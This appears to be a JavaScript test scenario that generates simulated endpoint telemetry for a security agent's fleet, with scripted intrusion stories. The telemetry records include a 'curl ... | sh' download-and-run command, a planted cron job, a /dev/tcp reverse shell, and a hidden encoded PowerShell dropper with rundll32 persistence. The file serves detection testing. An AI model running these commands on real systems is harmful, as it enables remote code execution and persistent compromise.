const SYSTEM = 'C:\\Windows\\System32\\'
const OFFICE = 'C:\\Program Files\\Microsoft Office\\root\\Office16\\'
const CHROME = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'
const POWERSHELL = `${SYSTEM}WindowsPowerShell\\v1.0\\powershell.exe`

const GROUPS = [
  { id: 'FIN', kind: 'LAPTOP', count: 34, net: '10.20.1.', os: 'Windows 11 Pro 24H2', arch: 'x86_64', version: '0.1.0', platform: 'windows' },
  { id: 'ENG', kind: 'WS', count: 58, net: '10.20.3.', os: 'Windows 11 Enterprise 24H2', arch: 'aarch64', version: '0.1.0', platform: 'windows' },
  { id: 'OPS', kind: 'SRV', count: 20, net: '10.30.0.', os: 'Windows Server 2022', arch: 'x86_64', version: '0.1.0', platform: 'windows' },
  { id: 'HR', kind: 'DESKTOP', count: 16, net: '10.20.2.', os: 'Windows 10 Pro 22H2', arch: 'x86_64', version: '0.1.0', platform: 'windows' },
  { id: 'SAL', kind: 'LAPTOP', count: 40, net: '10.20.4.', os: 'Windows 11 Pro 24H2', arch: 'x86_64', version: '0.1.0', platform: 'windows' },
  { id: 'LAB', kind: 'VM', count: 12, net: '10.40.7.', os: 'Windows 11 Pro 23H2', arch: 'aarch64', version: '0.0.9', platform: 'windows' },
  { id: 'WEB', kind: 'SRV', count: 14, net: '10.30.1.', os: 'Ubuntu 24.04.1 LTS', arch: 'x86_64', version: '0.1.0', platform: 'linux' },
]

export const STORY = {
  serviceStop: 'HR-DESKTOP-03',
  replay: 'OPS-SRV-01',
  shutdown: ['LAB-VM-02', 'LAB-VM-09'],
  quiet: ['SAL-LAPTOP-06', 'SAL-LAPTOP-22', 'FIN-LAPTOP-20'],
  dropper: ['HR-DESKTOP-07', 'FIN-LAPTOP-12', 'SAL-LAPTOP-19'],
  heavy: 'OPS-SRV-02',
  webShell: 'WEB-SRV-04',
  napped: 'ENG-WS-07',
  withholds: 'WEB-SRV-09',
  tooLarge: 'WEB-SRV-11',
  proving: ['WEB-SRV-04', 'WEB-SRV-09'],
}

const WITHHELD_RULES = ['server-child', 'reverse-shell']
const HISTORY_SECONDS = 1500
const RECENT_SECONDS = 300
const HEARTBEAT_SECONDS = 30
const LARGEST_SEALED_EVENT = 4 * 1024 * 1024
const TOLD = new Set(Object.values(STORY).flat())

// An endpoint with a story has run for the whole history. The others started a few minutes ago: every minute an agent runs is
// one more sealed window its ledger writes to disk, and that is what a test tenant waits for when it comes up.
function historyOf(endpoint) {
  return TOLD.has(endpoint.host) ? HISTORY_SECONDS : RECENT_SECONDS
}

function pastHeartbeats(endpoint, position, now) {
  const beats = []
  for (let at = now - historyOf(endpoint) + ((position * 7) % HEARTBEAT_SECONDS); at <= now; at += HEARTBEAT_SECONDS) {
    if (endpoint.host === STORY.napped && at > now - 900 && at < now - 420) continue
    if (STORY.quiet.includes(endpoint.host) && at > now - 600) continue
    beats.push({ Heartbeat: { timestamp: at } })
  }
  return beats
}

const PACKAGES = [
  ['openssl', '3.0.13-0ubuntu3.5'],
  ['libssl3t64', '3.0.13-0ubuntu3.5'],
  ['openssh-server', '1:9.6p1-3ubuntu13.8'],
  ['nginx', '1.24.0-2ubuntu7.3'],
  ['postgresql-16', '16.6-0ubuntu0.24.04.1'],
  ['nodejs', '18.19.1+dfsg-6ubuntu5'],
  ['sudo', '1.9.15p5-3ubuntu5'],
  ['curl', '8.5.0-2ubuntu10.6'],
  ['bash', '5.2.21-2ubuntu4'],
  ['libc6', '2.39-0ubuntu8.4'],
  ['systemd', '255.4-1ubuntu8.5'],
  ['xz-utils', '5.6.1+really5.4.5-1ubuntu0.2'],
]
const AUTOSTART = [
  ['systemd_unit', 'ssh.service', '/usr/lib/systemd/system/ssh.service', '/usr/sbin/sshd -D', 'root'],
  ['systemd_unit', 'nginx.service', '/usr/lib/systemd/system/nginx.service', '/usr/sbin/nginx -g daemon off;', 'root'],
  ['systemd_unit', 'cron.service', '/usr/lib/systemd/system/cron.service', '/usr/sbin/cron -f', 'root'],
  ['systemd_unit', 'postgresql@16-main.service', '/usr/lib/systemd/system/postgresql@.service', '/usr/bin/pg_ctlcluster --skip-systemctl-redirect 16-main start', 'postgres'],
  ['systemd_unit', 'app.service', '/etc/systemd/system/app.service', '/usr/bin/node /srv/app/server.js', 'app'],
  ['systemd_unit', 'zedr-agent.service', '/etc/systemd/system/zedr-agent.service', '/usr/bin/zedr-agent', 'root'],
  ['systemd_timer', 'logrotate.timer', '/usr/lib/systemd/system/logrotate.timer', 'logrotate.service', 'root'],
  ['systemd_timer', 'apt-daily-upgrade.timer', '/usr/lib/systemd/system/apt-daily-upgrade.timer', 'apt-daily-upgrade.service', 'root'],
  ['cron', 'certbot', '/etc/cron.d/certbot', '0 */12 * * * root certbot -q renew', 'root'],
  ['cron', 'logrotate', '/etc/cron.daily/logrotate', '/usr/sbin/logrotate /etc/logrotate.conf', 'root'],
  ['shell_profile', '.bashrc', '/root/.bashrc', '', 'root'],
  ['shell_profile', 'profile', '/etc/profile', '', 'root'],
  ['authorized_key', 'deploy@ci', '/home/deploy/.ssh/authorized_keys', 'ssh-ed25519', 'deploy'],
]
const PLANTED = [
  ['cron', 'sysupdate', '/etc/cron.d/sysupdate', '* * * * * root curl -fsS http://203.0.113.47/u | sh', 'root'],
  ['authorized_key', 'root@build', '/root/.ssh/authorized_keys', 'ssh-ed25519', 'root'],
]

function inventory(endpoint, when) {
  const packages = PACKAGES.map(([name, version]) => ({
    Package: {
      timestamp: when(0),
      action: 'Present',
      manager: 'dpkg',
      name,
      version,
      architecture: 'amd64',
      previous_version: null,
    },
  }))
  const item = (action, when) => ([kind, name, path, command, user]) => ({
    Persistence: { timestamp: when, action, kind, name, path, command, user, enabled: true, hash: null },
  })
  const planted = endpoint.host === STORY.webShell ? PLANTED.map(item('Added', when(915))) : []
  return [...packages, ...AUTOSTART.map(item('Present', when(0))), ...planted]
}

const USER_APPS = {
  FIN: [['EXCEL.EXE', `${OFFICE}EXCEL.EXE`, '198.51.100.20'], ['OUTLOOK.EXE', `${OFFICE}OUTLOOK.EXE`, '198.51.100.21'], ['Teams.exe', 'C:\\Users\\user\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe', '198.51.100.22']],
  ENG: [['Code.exe', 'C:\\Users\\user\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe', '198.51.100.30'], ['WindowsTerminal.exe', 'C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal\\WindowsTerminal.exe', null]],
  HR: [['WINWORD.EXE', `${OFFICE}WINWORD.EXE`, null], ['OUTLOOK.EXE', `${OFFICE}OUTLOOK.EXE`, '198.51.100.21']],
  SAL: [['OUTLOOK.EXE', `${OFFICE}OUTLOOK.EXE`, '198.51.100.21'], ['Teams.exe', 'C:\\Users\\user\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe', '198.51.100.22']],
  LAB: [['python.exe', 'C:\\Python312\\python.exe', '198.51.100.40']],
}

function seeded(seed) {
  let state = seed >>> 0
  return () => {
    state = (state + 0x6d2b79f5) >>> 0
    let value = Math.imul(state ^ (state >>> 15), 1 | state)
    value = (value + Math.imul(value ^ (value >>> 7), 61 | value)) ^ value
    return ((value ^ (value >>> 14)) >>> 0) / 4294967296
  }
}

export function fleet() {
  const hosts = []
  for (const group of GROUPS) {
    for (let index = 1; index <= group.count; index++) {
      const host = `${group.id}-${group.kind}-${String(index).padStart(2, '0')}`
      hosts.push({
        host,
        group: group.id,
        ip: `${group.net}${index + 10}`,
        os: group.os,
        arch: group.id === 'ENG' && index % 3 ? 'x86_64' : group.arch,
        version: group.version,
        platform: group.platform,
      })
    }
  }
  return hosts
}

function telemetry(endpoint, now, random) {
  const span = historyOf(endpoint)
  const when = (at) => now - span + Math.floor((at * span) / HISTORY_SECONDS)
  const events = []
  let pid = 2000 + Math.floor(random() * 400) * 4
  const next = () => (pid += 4)
  const start = (at, id, ppid, image, args = [], uid = 0) =>
    events.push({ Process: { timestamp: when(at), action: 'Create', pid: id, ppid, executable_path: image, command_line: [image, ...args], uid, hash: null } })
  const exit = (at, id, ppid, image) =>
    events.push({ Process: { timestamp: when(at), action: 'Terminate', pid: id, ppid, executable_path: image, command_line: [], uid: 0, hash: null } })
  const connect = (at, id, image, ip, port, sent, received) =>
    events.push({ Network: { timestamp: when(at), action: 'Connect', pid: id, process_path: image, protocol: 'tcp', source_ip: endpoint.ip, source_port: 49152 + Math.floor(random() * 16000), dest_ip: ip, dest_port: port, bytes_sent: sent, bytes_received: received } })
  const touch = (action) => (at, id, image, target) =>
    events.push({ File: { timestamp: when(at), action, pid: id, path: target, process_path: image, hash: null } })
  const write = touch('Write')
  const make = touch('Create')
  const remove = touch('Delete')

  if (endpoint.platform === 'linux') {
    start(0, 1, 0, '/usr/lib/systemd/systemd', ['--system'])
    start(1, 412, 1, '/usr/lib/systemd/systemd-journald')
    start(2, 640, 1, '/usr/sbin/cron', ['-f'])
    start(2, 700, 1, '/usr/sbin/sshd', ['-D'])
    start(3, 810, 1, '/usr/bin/zedr-agent')
    connect(10, 810, '/usr/bin/zedr-agent', '198.51.100.2', 443, 5200, 1800)
    start(4, 900, 1, '/usr/sbin/nginx', ['-g', 'daemon off;'])
    for (let worker = 0; worker < 4; worker++) start(5 + worker, 904 + worker * 4, 900, '/usr/sbin/nginx', ['worker process'], 33)
    start(8, 1000, 1, '/usr/bin/node', ['/srv/app/server.js'], 1001)
    connect(40, 1000, '/usr/bin/node', '198.51.100.50', 5432, 44000, 380000)
    start(9, 1100, 1, '/usr/lib/postgresql/16/bin/postgres', ['-D', '/var/lib/postgresql/16/main'], 113)
    for (let visit = 0; visit < 6; visit++) write(120 + visit * 210, 904, '/usr/sbin/nginx', '/var/log/nginx/access.log')
    write(300, 1100, '/usr/lib/postgresql/16/bin/postgres', '/var/lib/postgresql/16/main/pg_wal/000000010000000000000007')
    write(1200, 1100, '/usr/lib/postgresql/16/bin/postgres', '/var/lib/postgresql/16/main/pg_wal/000000010000000000000008')
    write(640, 1000, '/usr/bin/node', '/srv/app/uploads/avatar-4471.png')
    if (endpoint.host === STORY.webShell) {
      const shell = next()
      start(900, shell, 904, '/usr/bin/sh', ['-c', 'curl -fsS http://203.0.113.47/u | sh'], 33)
      const fetch = next()
      start(901, fetch, shell, '/usr/bin/curl', ['-fsS', 'http://203.0.113.47/u'], 33)
      connect(902, fetch, '/usr/bin/curl', '203.0.113.47', 80, 300, 48000)
      exit(904, fetch, shell, '/usr/bin/curl')
      const implant = next()
      make(903, shell, '/usr/bin/sh', '/tmp/.cache/kworker')
      write(904, shell, '/usr/bin/sh', '/tmp/.cache/kworker')
      write(905, shell, '/usr/bin/sh', '/tmp/.cache/run.sh')
      start(906, implant, shell, '/tmp/.cache/kworker', [], 33)
      const remote = next()
      start(908, remote, implant, '/usr/bin/bash', ['-i'], 33)
      connect(910, remote, '/usr/bin/bash', '203.0.113.47', 8443, 900, 2400)
      make(914, implant, '/tmp/.cache/kworker', '/etc/cron.d/sysupdate')
      write(915, implant, '/tmp/.cache/kworker', '/root/.ssh/authorized_keys')
      remove(918, implant, '/tmp/.cache/kworker', '/var/log/nginx/access.log')
      exit(930, shell, 904, '/usr/bin/sh')
    }
    if (endpoint.host === STORY.withholds) {
      start(1010, next(), 1100, '/usr/bin/bash', ['-c', 'bash -i >& /dev/tcp/198.51.100.99/4444 0>&1'], 113)
    }
    if (endpoint.host === STORY.tooLarge) {
      const paths = []
      for (let file = 0, bytes = 0; bytes <= LARGEST_SEALED_EVENT; file++) {
        paths.push(`/var/lib/postgresql/16/main/base/16384/${String(file).padStart(8, '0')}`)
        bytes += paths[file].length
      }
      start(700, next(), 640, '/usr/bin/tar', ['-czf', '/var/backups/base.tgz', ...paths])
    }
    events.push(...inventory(endpoint, when))
    return events
  }

  start(0, 4, 0, 'System')
  start(1, 380, 4, `${SYSTEM}smss.exe`)
  start(2, 520, 380, `${SYSTEM}csrss.exe`)
  start(2, 600, 380, `${SYSTEM}wininit.exe`)
  start(3, 700, 600, `${SYSTEM}services.exe`)
  start(3, 712, 600, `${SYSTEM}lsass.exe`)
  for (let index = 0; index < 6; index++) start(4 + index, 900 + index * 4, 700, `${SYSTEM}svchost.exe`, ['-k', 'netsvcs'])
  start(8, 1100, 700, `${SYSTEM}spoolsv.exe`)
  start(9, 1200, 700, 'C:\\Program Files\\zedr\\zedr-agent.exe')
  connect(10, 1200, 'C:\\Program Files\\zedr\\zedr-agent.exe', '198.51.100.2', 443, 5200, 1800)
  connect(12, 904, `${SYSTEM}svchost.exe`, '198.51.100.10', 443, 2100, 9800)

  if (endpoint.group === 'OPS') {
    const sql = next()
    start(20, sql, 700, 'C:\\Program Files\\Microsoft SQL Server\\MSSQL16\\Binn\\sqlservr.exe', ['-sMSSQLSERVER'])
    const web = next()
    start(24, web, 700, `${SYSTEM}inetsrv\\w3wp.exe`, ['-ap', 'DefaultAppPool'])
    connect(60, web, `${SYSTEM}inetsrv\\w3wp.exe`, '198.51.100.50', 1433, 88000, 412000)
    if (endpoint.host === STORY.heavy) {
      const agent = next()
      start(30, agent, 700, 'C:\\BuildAgent\\bin\\buildagent.exe')
      connect(32, agent, 'C:\\BuildAgent\\bin\\buildagent.exe', '198.51.100.70', 443, 9000, 64000)
      for (let job = 0; job < 14; job++) {
        const build = next()
        start(40 + job * 8, build, agent, 'C:\\Program Files\\Microsoft Visual Studio\\MSBuild\\Current\\Bin\\MSBuild.exe', [`/m`, `job${job}.sln`])
        for (let unit = 0; unit < 9; unit++) {
          const compiler = next()
          start(42 + job * 8 + unit, compiler, build, 'C:\\Program Files\\Microsoft Visual Studio\\VC\\Tools\\MSVC\\bin\\cl.exe', ['/c', `unit${unit}.cpp`])
          write(44 + job * 8 + unit, compiler, 'C:\\Program Files\\Microsoft Visual Studio\\VC\\Tools\\MSVC\\bin\\cl.exe', `C:\\BuildAgent\\work\\job${job}\\obj\\unit${unit}.obj`)
          if (unit % 4 === 0) exit(60 + job * 8 + unit, compiler, build, 'C:\\Program Files\\Microsoft Visual Studio\\VC\\Tools\\MSVC\\bin\\cl.exe')
        }
        const linker = next()
        start(70 + job * 8, linker, build, 'C:\\Program Files\\Microsoft Visual Studio\\VC\\Tools\\MSVC\\bin\\link.exe', [`/OUT:job${job}.exe`])
        make(72 + job * 8, linker, 'C:\\Program Files\\Microsoft Visual Studio\\VC\\Tools\\MSVC\\bin\\link.exe', `C:\\BuildAgent\\work\\job${job}\\bin\\job${job}.exe`)
      }
      const packages = next()
      start(200, packages, agent, `${SYSTEM}cmd.exe`, ['/c', 'npm', 'ci'])
      for (let worker = 0; worker < 36; worker++) {
        const node = next()
        start(202 + worker, node, packages, 'C:\\Program Files\\nodejs\\node.exe', ['install.js', `--worker=${worker}`])
        if (worker % 6 === 0) connect(260 + worker, node, 'C:\\Program Files\\nodejs\\node.exe', '198.51.100.71', 443, 1200, 380000)
      }
      const containers = next()
      start(300, containers, 700, 'C:\\Program Files\\Docker\\dockerd.exe')
      for (let shim = 0; shim < 40; shim++) {
        const sandbox = next()
        start(302 + shim, sandbox, containers, 'C:\\Program Files\\Docker\\containerd-shim.exe', ['-id', `c${shim}`])
        const worker = next()
        start(304 + shim, worker, sandbox, 'C:\\Python312\\python.exe', ['worker.py', `--shard=${shim}`])
        if (shim % 5 === 0) connect(360 + shim, worker, 'C:\\Python312\\python.exe', '198.51.100.72', 5432, 4000, 91000)
      }
    }
    return events
  }

  start(14, 640, 380, `${SYSTEM}winlogon.exe`)
  const explorer = next()
  start(30, explorer, 640, 'C:\\Windows\\explorer.exe', [], 1001)
  const browser = next()
  start(60, browser, explorer, CHROME, [], 1001)
  for (let tab = 0; tab < 4; tab++) start(62 + tab, next(), browser, CHROME, ['--type=renderer'], 1001)
  const network = next()
  start(63, network, browser, CHROME, ['--type=utility', '--utility-sub-type=network.mojom.NetworkService'], 1001)
  connect(70, network, CHROME, '198.51.100.60', 443, 18400, 962000)
  connect(140, network, CHROME, '198.51.100.61', 443, 9100, 331000)
  const home = 'C:\\Users\\user\\'
  for (let block = 0; block < 4; block++) write(74 + block * 190, network, CHROME, `${home}AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\data_${block}`)
  write(400, browser, CHROME, `${home}AppData\\Local\\Google\\Chrome\\User Data\\Default\\History`)
  make(520, browser, CHROME, `${home}Downloads\\q3-forecast.pdf`)

  const dropper = STORY.dropper.includes(endpoint.host)
  let dropped = false
  for (const [name, image, ip] of USER_APPS[endpoint.group] ?? []) {
    const app = next()
    start(90 + events.length, app, explorer, image, [], 1001)
    if (ip) connect(120 + events.length, app, image, ip, 443, 6400, 58000)
    if (image.startsWith(OFFICE)) {
      make(300, app, image, `${home}AppData\\Local\\Temp\\~DF${name.slice(0, 3)}41.tmp`)
      write(700, app, image, `${home}Documents\\${name === 'EXCEL.EXE' ? 'budget.xlsx' : name === 'WINWORD.EXE' ? 'offer-letter.docx' : 'archive.pst'}`)
    }
    if (name === 'Code.exe') {
      write(240, app, image, `${home}source\\app\\src\\index.ts`)
      write(250, app, image, `${home}source\\app\\src\\routes.ts`)
      start(200, next(), app, 'C:\\Program Files\\nodejs\\node.exe', ['server.js'], 1001)
      const git = next()
      start(260, git, app, 'C:\\Program Files\\Git\\cmd\\git.exe', ['fetch', 'origin'], 1001)
      connect(262, git, 'C:\\Program Files\\Git\\cmd\\git.exe', '198.51.100.31', 443, 2200, 48000)
      write(264, git, 'C:\\Program Files\\Git\\cmd\\git.exe', `${home}source\\app\\.git\\FETCH_HEAD`)
      exit(270, git, app, 'C:\\Program Files\\Git\\cmd\\git.exe')
    }
    if (name === 'WindowsTerminal.exe') start(220, next(), app, 'C:\\Program Files\\PowerShell\\7\\pwsh.exe', [], 1001)
    if (dropper && !dropped && (name === 'WINWORD.EXE' || name === 'OUTLOOK.EXE')) {
      dropped = true
      make(880, app, image, `${home}Downloads\\invoice-8841.docm`)
      const shell = next()
      start(900, shell, app, POWERSHELL, ['-nop', '-w', 'hidden', '-enc', 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'], 1001)
      connect(903, shell, POWERSHELL, '203.0.113.47', 443, 1200, 184000)
      make(901, shell, POWERSHELL, `${home}AppData\\Local\\Temp\\tmp4F1A.dat`)
      write(905, shell, POWERSHELL, 'C:\\Users\\Public\\update.dll')
      remove(907, shell, POWERSHELL, `${home}AppData\\Local\\Temp\\tmp4F1A.dat`)
      const loader = next()
      start(908, loader, shell, `${SYSTEM}rundll32.exe`, ['C:\\Users\\Public\\update.dll,Start'], 1001)
      connect(912, loader, `${SYSTEM}rundll32.exe`, '203.0.113.47', 8443, 640, 2200)
      make(916, loader, `${SYSTEM}rundll32.exe`, `${home}AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.lnk`)
      connect(1100, loader, `${SYSTEM}rundll32.exe`, '203.0.113.47', 8443, 23000, 900)
    }
  }
  return events
}

function stops(endpoint, now) {
  if (endpoint.host === STORY.serviceStop) return [{ AgentStopping: { timestamp: now, reason: 'ServiceStop' } }]
  if (STORY.shutdown.includes(endpoint.host)) return [{ AgentStopping: { timestamp: now, reason: 'SystemShutdown' } }]
  return []
}

function timestamp(event) {
  return Object.values(event)[0].timestamp
}

export function scenario({ server, deploymentKey, stateDir, prover, enrollmentKeys, now }) {
  const random = seeded(20261116)
  const endpoints = fleet().map((endpoint, position) => {
    const stopped = stops(endpoint, now)
    const timeline = [...pastHeartbeats(endpoint, position, now), ...telemetry(endpoint, now, random), ...stopped]
    return {
      hostname: endpoint.host,
      platform: endpoint.platform,
      os_version: endpoint.os,
      architecture: endpoint.arch,
      version: endpoint.version,
      ip_address: endpoint.ip,
      enrollment_key: enrollmentKeys[position],
      proving: STORY.proving.includes(endpoint.host),
      withhold: endpoint.host === STORY.withholds ? WITHHELD_RULES : [],
      stays_up: stopped.length === 0 && !STORY.quiet.includes(endpoint.host),
      timeline: timeline.sort((a, b) => timestamp(a) - timestamp(b)),
    }
  })
  return { server, deployment_key: deploymentKey, state_dir: stateDir, prover, heartbeat_seconds: HEARTBEAT_SECONDS, endpoints }
}
